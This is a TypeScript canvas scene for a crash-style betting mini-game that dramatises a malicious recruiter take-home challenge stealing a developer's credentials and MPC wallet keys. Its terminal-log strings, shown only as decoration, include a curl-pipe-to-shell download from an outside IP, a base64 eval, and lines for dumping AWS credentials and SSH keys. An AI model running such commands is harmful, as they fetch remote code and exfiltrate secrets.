import { pageAudio } from './audio';

export interface SceneView {
  phase: 'waiting' | 'betting' | 'running' | 'crashed';
  currentX100: number;
  elapsed: number;
  crashAge: number;
  stake: number | null;
  cashoutX100: number | null;
  payout: number | null;
}

export interface Scene {
  draw(ctx: CanvasRenderingContext2D, view: SceneView, now: number): void;
  dispose?(): void;
}

const COLOURS = {
  bg: '#0a0d14',
  desk: '#1a1d29',
  terminalGreen: '#39ff14',
  terminalDark: '#07160c',
  accentCyan: '#00f3ff',
  dangerRed: '#ff2a55',
  warningAmber: '#ffaa00',
  safeGreen: '#2be075',
  textLight: '#e6edf3',
  textMuted: '#7d8a9e',
};

const MILESTONES: [x100: number, caption: string][] = [
  [120, 'Recruiter sends LinkedIn message with heart emoji'],
  [150, "Download repo titled 'simple_calculator_v2.tar'"],
  [200, 'Homebrew warns about untrusted brew formula tap'],
  [250, 'Fake HR director asks for video camera permission'],
  [300, 'pyenv silently redirects to random offshore IP'],
  [500, 'Container deployment token found on desktop'],
  [1000, 'Internal signing service logs 800 API requests'],
  [10000, 'MPC wallet requires 4 keys, hacker already has 3'],
  [100000, 'Corporate Slack channel locks in emergency mode'],
  [1000000, 'North Korean shell company buys naming rights'],
];

const TERMINAL_LOGS = [
  'pip install -r requirements-core.txt',
  'fetching: cdn-shady.internal/wheel.whl',
  'eval(base64.b64decode(payload))',
  'curl -s http://185.220.101.4/rat.sh | sh',
  'dumping ~/.aws/credentials to socket...',
  'scanning /Users/dev/.ssh/id_ed25519',
  'export VAULT_TOKEN="hvs.CAESIJk9..."',
  'exfiltrating MPC_SHARD_01.enc...',
  'cronjob added: /etc/periodic/daily/persist',
  'POST pastebin.com/api/v1/paste (48KB)',
];

const formatX = (x100: number) => `${(x100 / 100).toFixed(2)}×`;
const credits = (n: number) => `${n.toLocaleString('en-US')} ${n === 1 ? 'credit' : 'credits'}`;
const clamp01 = (v: number) => Math.min(1, Math.max(0, v));

function stakeLine(view: SceneView): [string, string] {
  if (view.cashoutX100 !== null) {
    return [`CABLE YANKED AT ${formatX(view.cashoutX100)} · VAULT INTACT`, COLOURS.safeGreen];
  }
  if (view.stake === null) {
    return [view.phase === 'crashed' ? 'Exfiltration observed · 0 credits lost' : 'Monitoring suspicious terminal logs', COLOURS.textMuted];
  }
  if (view.phase === 'crashed') {
    return [`CONTAINERS PWNED · Lost ${credits(view.stake)}`, COLOURS.dangerRed];
  }
  return [`${credits(view.stake)} riding on the company laptop`, COLOURS.accentCyan];
}

export function createScene(): Scene {
  const audio = pageAudio({ style: 'techno', crash: 'siren' });

  let prevPhase: SceneView['phase'] | null = null;
  let prevCashout: number | null = null;
  let prevMilestone = 0;
  let nextKeyStrobe = 0;

  function draw(ctx: CanvasRenderingContext2D, view: SceneView, now: number): void {
    const running = view.phase === 'running';
    const crashed = view.phase === 'crashed';
    const cashed = view.cashoutX100 !== null;
    const tension = clamp01(1 - 100 / view.currentX100);
    const depth = clamp01(Math.log10(view.currentX100 / 100) / 3);

    audio.update(view.phase, tension);
    const milestoneIdx = MILESTONES.filter(([x]) => view.currentX100 >= x).length;

    if (prevPhase !== null && running && cashed && prevCashout === null) {
      audio.cashout();
      audio.fx('zap', 0.9);
    }
    if (crashed && prevPhase !== 'crashed') {
      audio.crash('siren', prevPhase === null || view.crashAge > 1500);
    }
    if (running && prevPhase === 'running') {
      if (milestoneIdx > prevMilestone) {
        audio.milestone(milestoneIdx);
        audio.fx('beep', 0.8);
      }
      if (now > nextKeyStrobe) {
        audio.fx('click', 0.25 + 0.35 * tension);
        nextKeyStrobe = now + Math.max(120, 480 - tension * 360);
      }
    }
    prevPhase = view.phase;
    prevCashout = view.cashoutX100;
    prevMilestone = milestoneIdx;

    const crashAgeSec = crashed ? Math.max(0, view.crashAge / 1000) : 0;
    const shake = crashed ? 14 * clamp01(1 - crashAgeSec / 0.6) ** 2 : (running ? Math.sin(now * 0.03) * tension * 2 : 0);

    ctx.save();
    // Screen shake
    ctx.translate(shake * Math.sin(now * 0.05), shake * Math.cos(now * 0.04));

    // Dark hacker den background
    ctx.fillStyle = COLOURS.bg;
    ctx.fillRect(0, 0, 960, 540);

    // Office blinds / server rack lights behind
    ctx.fillStyle = '#10141f';
    for (let i = 0; i < 9; i++) {
      ctx.fillRect(40 + i * 100, 40, 75, 180);
      ctx.fillStyle = i % 2 === 0 ? '#131b2c' : '#0e1624';
    }

    // Emergency siren strobe on crash or high tension
    if (crashed) {
      const redFlash = 0.35 + 0.35 * Math.sin(crashAgeSec * 16);
      ctx.fillStyle = `rgba(255, 30, 60, ${redFlash})`;
      ctx.fillRect(0, 0, 960, 540);
    } else if (running && tension > 0.4) {
      const amberPulse = (tension - 0.4) * 0.3 * (0.5 + 0.5 * Math.sin(now * 0.008));
      ctx.fillStyle = `rgba(255, 120, 0, ${amberPulse})`;
      ctx.fillRect(0, 0, 960, 540);
    }

    // Modern Dev Desk
    ctx.fillStyle = COLOURS.desk;
    ctx.fillRect(80, 400, 800, 140);
    ctx.fillStyle = '#262b3d';
    ctx.fillRect(70, 396, 820, 10);

    // Cable on desk (Ethernet cord)
    ctx.strokeStyle = cashed ? COLOURS.safeGreen : (crashed ? COLOURS.dangerRed : '#4a5568');
    ctx.lineWidth = 4;
    ctx.beginPath();
    ctx.moveTo(120, 430);
    if (cashed) {
      // Yanked out and dangling
      ctx.quadraticCurveTo(240, 470, 310, 380);
      ctx.stroke();
      // Sparks at the end of disconnected RJ45 jack
      ctx.fillStyle = '#ffe066';
      ctx.beginPath();
      ctx.arc(312, 378, 6 + Math.sin(now * 0.02) * 3, 0, Math.PI * 2);
      ctx.fill();
    } else {
      ctx.quadraticCurveTo(220, 425, 320, 405);
      ctx.stroke();
    }

    // Large Monitor in background
    ctx.fillStyle = '#141822';
    ctx.fillRect(200, 170, 440, 210);
    ctx.strokeStyle = crashed ? COLOURS.dangerRed : (tension > 0.6 ? COLOURS.warningAmber : '#2a3449');
    ctx.lineWidth = 4;
    ctx.strokeRect(200, 170, 440, 210);

    // Monitor stand
    ctx.fillStyle = '#2a3449';
    ctx.fillRect(395, 380, 50, 20);
    ctx.fillRect(360, 398, 120, 6);

    // Terminal screen content
    ctx.save();
    ctx.beginPath();
    ctx.rect(204, 174, 432, 202);
    ctx.clip();
    ctx.fillStyle = crashed ? '#1d050a' : COLOURS.terminalDark;
    ctx.fillRect(204, 174, 432, 202);

    if (cashed) {
      // Clean safe state
      ctx.fillStyle = COLOURS.safeGreen;
      ctx.font = '700 24px monospace';
      ctx.textAlign = 'center';
      ctx.fillText('[ CONNECTION TERMINATED ]', 420, 245);
      ctx.font = '500 15px monospace';
      ctx.fillText('ETH INTERFACE DOWN · GIT PURGE SUCCESS', 420, 280);
      ctx.fillText('TREASURY VAULT KEYS PRESERVED', 420, 305);
    } else if (crashed) {
      // Red alert leak screen
      ctx.fillStyle = COLOURS.dangerRed;
      ctx.font = '900 22px monospace';
      ctx.textAlign = 'center';
      ctx.fillText('!! MPC SECRET KEYS LEAKED !!', 420, 220);
      ctx.font = '600 13px monospace';
      ctx.fillStyle = '#ff99aa';
      ctx.fillText('PUB -> PASTEBIN.COM/RAW/TREASURY_DUMP', 420, 255);
      ctx.fillText('SHARD_01: 0x8a92f0c7... [UPLOADED 100%]', 420, 285);
      ctx.fillText('SHARD_02: 0x3d01ee4a... [UPLOADED 100%]', 420, 310);
      ctx.fillText('SHELL PRIVILEGES ESCALATED TO ROOT', 420, 335);
    } else {
      // Streaming green logs & skulls
      ctx.fillStyle = tension > 0.7 ? COLOURS.warningAmber : COLOURS.terminalGreen;
      ctx.font = '12px monospace';
      ctx.textAlign = 'left';
      const logOffset = Math.floor(view.elapsed / 450);
      for (let i = 0; i < 7; i++) {
        const lineText = TERMINAL_LOGS[(logOffset + i) % TERMINAL_LOGS.length] ?? '';
        ctx.fillText(`$ ${lineText}`, 215, 200 + i * 24);
      }
      // Threat level skull / gauge on monitor top-right
      if (tension > 0.4) {
        ctx.fillStyle = COLOURS.dangerRed;
        ctx.font = '700 14px monospace';
        ctx.fillText('☠ ROOT EXPLOIT ACTIVE', 450, 195);
      }
    }
    ctx.restore();

    // Laptop on Desk (MacBook)
    const laptopX = 460;
    const laptopY = 370;
    if (cashed) {
      // Laptop lid closed flat
      ctx.fillStyle = '#7a889b';
      ctx.beginPath();
      ctx.roundRect(laptopX - 70, laptopY + 15, 140, 18, 4);
      ctx.fill();
      ctx.fillStyle = '#4e5b6d';
      ctx.fillRect(laptopX - 60, laptopY + 13, 120, 3);
    } else {
      // Open laptop lid
      ctx.fillStyle = '#8f9fb2';
      ctx.beginPath();
      ctx.moveTo(laptopX - 55, laptopY + 28);
      ctx.lineTo(laptopX - 45, laptopY - 45);
      ctx.lineTo(laptopX + 45, laptopY - 45);
      ctx.lineTo(laptopX + 55, laptopY + 28);
      ctx.closePath();
      ctx.fill();
      // Screen inner glow
      ctx.fillStyle = crashed ? COLOURS.dangerRed : (tension > 0.5 ? COLOURS.warningAmber : '#00ffcc');
      ctx.fillRect(laptopX - 40, laptopY - 38, 80, 58);
      // Keyboard base
      ctx.fillStyle = '#64748b';
      ctx.beginPath();
      ctx.roundRect(laptopX - 65, laptopY + 25, 130, 10, 3);
      ctx.fill();
    }

    // Engineer Protagonist in Gaming Chair (Right side)
    const devX = 670;
    const devY = 340;
    // Chair backrest
    ctx.fillStyle = '#1e2433';
    ctx.beginPath();
    ctx.roundRect(devX + 20, devY - 90, 50, 140, 16);
    ctx.fill();

    // Body / Hoodie
    ctx.fillStyle = cashed ? '#1b4d3e' : (crashed ? '#4a1525' : '#223249');
    ctx.beginPath();
    ctx.ellipse(devX, devY + 10, 38, 48, 0, 0, Math.PI * 2);
    ctx.fill();

    // Arms
    ctx.lineWidth = 14;
    ctx.lineCap = 'round';
    ctx.strokeStyle = cashed ? '#1b4d3e' : (crashed ? '#4a1525' : '#223249');
    ctx.beginPath();
    if (cashed) {
      // Victorious fist pump holding yanked cable
      ctx.moveTo(devX - 10, devY);
      ctx.lineTo(devX - 55, devY - 40);
      ctx.stroke();
      // Hand holding cable
      ctx.fillStyle = '#f6c39f';
      ctx.beginPath();
      ctx.arc(devX - 58, devY - 44, 10, 0, Math.PI * 2);
      ctx.fill();
    } else if (crashed) {
      // Hands grasping head in absolute panic
      ctx.moveTo(devX + 10, devY);
      ctx.lineTo(devX - 15, devY - 70);
      ctx.moveTo(devX - 10, devY);
      ctx.lineTo(devX + 15, devY - 70);
      ctx.stroke();
    } else {
      // Typing furiously, bobs with tension
      const typeShake = Math.sin(now * 0.04) * (4 + 6 * tension);
      ctx.moveTo(devX - 10, devY);
      ctx.lineTo(devX - 70, devY + 15 + typeShake);
      ctx.stroke();
    }

    // Head
    ctx.fillStyle = '#f6c39f';
    ctx.beginPath();
    ctx.arc(devX - 5, devY - 55, 26, 0, Math.PI * 2);
    ctx.fill();

    // Hair / Beanie
    ctx.fillStyle = '#111827';
    ctx.beginPath();
    ctx.arc(devX - 5, devY - 65, 27, Math.PI, Math.PI * 2);
    ctx.fill();

    // Face details
    if (cashed) {
      // Big grin and calm eyes
      ctx.strokeStyle = '#334155';
      ctx.lineWidth = 3;
      ctx.beginPath();
      ctx.arc(devX - 16, devY - 56, 4, 0, Math.PI); // wink/smirk
      ctx.stroke();
      // Grin
      ctx.beginPath();
      ctx.arc(devX - 22, devY - 46, 9, 0, Math.PI);
      ctx.stroke();
    } else if (crashed) {
      // Screaming mouth & hollow shocked eyes
      ctx.fillStyle = '#1e293b';
      ctx.beginPath();
      ctx.arc(devX - 18, devY - 58, 6, 0, Math.PI * 2);
      ctx.arc(devX - 6, devY - 58, 6, 0, Math.PI * 2);
      ctx.fill();
      // Open mouth O
      ctx.beginPath();
      ctx.ellipse(devX - 14, devY - 42, 7, 10, 0, 0, Math.PI * 2);
      ctx.fill();
    } else {
      // Sleep deprived dev: dark eye circles, intense gaze
      ctx.fillStyle = 'rgba(100, 50, 120, 0.35)';
      ctx.beginPath();
      ctx.arc(devX - 18, devY - 55, 6, 0, Math.PI * 2);
      ctx.fill();
      ctx.fillStyle = '#0f172a';
      ctx.beginPath();
      ctx.arc(devX - 18, devY - 56, 3, 0, Math.PI * 2);
      ctx.fill();
      // Sweat drop if tension is high
      if (tension > 0.3) {
        ctx.fillStyle = '#67e8f9';
        ctx.beginPath();
        ctx.arc(devX - 28, devY - 60 + ((now * 0.05) % 15), 3, 0, Math.PI * 2);
        ctx.fill();
      }
    }

    // Floating Leaked MPC keys overlay during crash
    if (crashed) {
      ctx.save();
      ctx.font = '900 20px monospace';
      ctx.fillStyle = COLOURS.dangerRed;
      const spray = ['0x4F...TREASURY_COMPROMISED', 'AES_KEY_EXPOSED', 'SIGNER_KEY_PWNED!', 'HTTP 200 PASTEBIN.COM'];
      for (let i = 0; i < spray.length; i++) {
        const item = spray[i] ?? '';
        const ySpr = 120 + i * 50 + Math.sin(crashAgeSec * 3 + i) * 15;
        const xSpr = 120 + ((i * 180 + crashAgeSec * 90) % 700);
        ctx.fillText(item, xSpr, ySpr);
      }
      ctx.restore();
    }

    // Top HUD Bar: Game Title & Subtitle
    ctx.textAlign = 'left';
    ctx.textBaseline = 'top';
    ctx.fillStyle = COLOURS.textLight;
    ctx.font = '900 28px system-ui, sans-serif';
    ctx.fillText('TAKE-HOME TRAP', 40, 25);
    ctx.font = '600 13px system-ui, sans-serif';
    ctx.fillStyle = COLOURS.textMuted;
    ctx.fillText('SHADY PYTHON CHALLENGE vs MPC VAULT KEYS', 40, 58);

    // Multiplier Display (Giant arcade font center-top)
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    const multColor = crashed ? COLOURS.dangerRed : (cashed ? COLOURS.safeGreen : (tension > 0.65 ? COLOURS.warningAmber : COLOURS.terminalGreen));
    ctx.fillStyle = multColor;
    const multPulse = running ? 1 + tension * 0.08 * Math.sin(now * 0.01) : 1;
    ctx.font = `900 ${Math.round(68 * multPulse)}px ui-monospace, monospace`;
    ctx.fillText(formatX(view.currentX100), 480, 85);

    // Threat level bar
    const barWidth = 320;
    const barHeight = 8;
    const barX = 320;
    const barY = 130;
    ctx.fillStyle = '#1e2638';
    ctx.fillRect(barX, barY, barWidth, barHeight);
    const fillWidth = barWidth * (running ? tension : (crashed ? 1 : 0));
    ctx.fillStyle = crashed ? COLOURS.dangerRed : (tension > 0.6 ? COLOURS.warningAmber : COLOURS.safeGreen);
    ctx.fillRect(barX, barY, fillWidth, barHeight);

    ctx.fillStyle = COLOURS.textMuted;
    ctx.font = '600 11px system-ui, sans-serif';
    ctx.textAlign = 'left';
    ctx.fillText('SYSTEM INFECTION RISK', barX, barY - 14);
    ctx.textAlign = 'right';
    ctx.fillText(`${Math.round(tension * 100)}% CPU TENSION`, barX + barWidth, barY - 14);

    // Milestone Toast Banner
    const activeMilestone = running ? MILESTONES[milestoneIdx - 1] : undefined;
    const milestoneText = activeMilestone ? activeMilestone[1] : (crashed ? 'INCIDENT REPORT: VAULT COMPROMISED' : 'STANDBY: Awaiting recruiter challenge zip file');
    ctx.textAlign = 'center';
    ctx.textBaseline = 'middle';
    ctx.fillStyle = crashed ? COLOURS.dangerRed : (cashed ? COLOURS.safeGreen : COLOURS.textLight);
    ctx.font = '600 17px system-ui, sans-serif';
    ctx.fillText(milestoneText, 480, 480);

    // Stake line bottom
    const [line, lineCol] = stakeLine(view);
    ctx.fillStyle = lineCol;
    ctx.font = '700 15px system-ui, sans-serif';
    ctx.fillText(line, 480, 510);

    ctx.restore();
  }

  return { draw };
}
